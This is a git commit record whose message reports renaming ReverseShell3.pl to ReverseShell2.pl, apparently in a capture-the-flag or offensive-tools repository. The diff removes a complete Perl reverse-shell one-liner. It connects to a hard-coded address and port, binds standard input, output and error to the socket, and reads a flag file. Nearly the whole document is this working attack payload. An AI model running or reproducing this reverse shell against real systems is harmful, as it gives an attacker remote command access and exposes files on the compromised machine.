481c63baae98c8cd60ec6792c4e10c0e2eaf555a
Sho07 <113521577+Sho2007@users.noreply.github.com>
2025-04-03 17:12:17 +0700

    Update and rename ReverseShell3.pl to ReverseShell2.pl

--- ReverseShell3.pl
+++
@@ -1,8 +0,0 @@
-perl -e 'use Socket;$i="10.8.0.99";$p=1337;
-socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
-if(connect(S,sockaddr_in($p,inet_aton($i)))) {
-    select(S); $|=1;
-    print S "=== Connected ===\n";
-    open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
-    system("cat /home/flag.txt");
-};'
